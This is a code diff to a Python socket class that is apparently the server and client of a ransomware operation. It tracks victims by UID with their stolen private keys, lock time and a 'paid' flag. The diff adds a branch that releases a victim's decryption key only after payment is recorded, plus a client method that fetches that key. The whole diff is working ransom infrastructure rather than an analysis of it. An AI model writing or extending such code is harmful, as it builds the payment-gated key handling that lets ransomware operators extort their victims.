@@ -29,26 +29,35 @@ class MySocket:
                 print(f"Victim Data:{req}")
                 victimList = readJson(testPath)
 
-                if req["padding"] == True:
-                    UID = req["UID"]
-                    for i in range(len(victimList)):
-                        if victimList[i]["UID"] == UID:
-                            victimList[i]["paid"] = True
+                if req["getPrivate"] == True:
+                    for victim in victimList:
+                        if victim["UID"] == req["UID"] and victim["paid"] == True:
+                            privateKey = json.dumps({"privateKey": victim["privateKey"]})
+                            clientSocket.send(privateKey.encode("utf-8"))
                             break
                 else:
-                    newVictimData = {
-                        "UID": req["UID"],
-                        "fileNumber": req["fileNumber"],
-                        "privateKey": req["privateKey"],
-                        "date": req["lockTime"],
-                        "paid": False
-                    }
-                    victimList.append(newVictimData)
-                writeJson(testPath,victimList)
+                    if req["padding"] == True:
+                        UID = req["UID"]
+                        for i in range(len(victimList)):
+                            if victimList[i]["UID"] == UID:
+                                victimList[i]["paid"] = True
+                                break
+                    else:
+                        newVictimData = {
+                            "UID": req["UID"],
+                            "fileNumber": req["fileNumber"],
+                            "privateKey": req["privateKey"],
+                            "date": req["lockTime"],
+                            "paid": False
+                        }
+                        victimList.append(newVictimData)
+                    writeJson(testPath,victimList)
+                
+                clientSocket.close()
 
             self.__tcpSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
             self.__tcpSocket.bind((self.__hostIP,self.__tcpPort))
-            self.__tcpSocket.listen(20)
+            self.__tcpSocket.listen(5)
             print("start TCP server")
 
             while not self.stopEvent.is_set():
@@ -100,3 +109,27 @@ class MySocket:
                     pass
 
             #s.send(data.encode())
+
+        def sendGetPrivateKey(self, uid, port):
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((self.__serverIP, port))
+
+            data = {
+                "getPrivate": True,
+                "UID": uid
+            }
+            connect = False
+            while not connect:
+                try:
+                    s.send(json.dumps(data).encode("utf-8"))
+                    connect = True
+                    print(connect)
+                except ConnectionResetError as e:
+                    pass
+
+            res = s.recv(4096)
+            if res:
+                res = json.loads(res.decode("utf-8"))["privateKey"]
+                return res
+            else:
+                return None
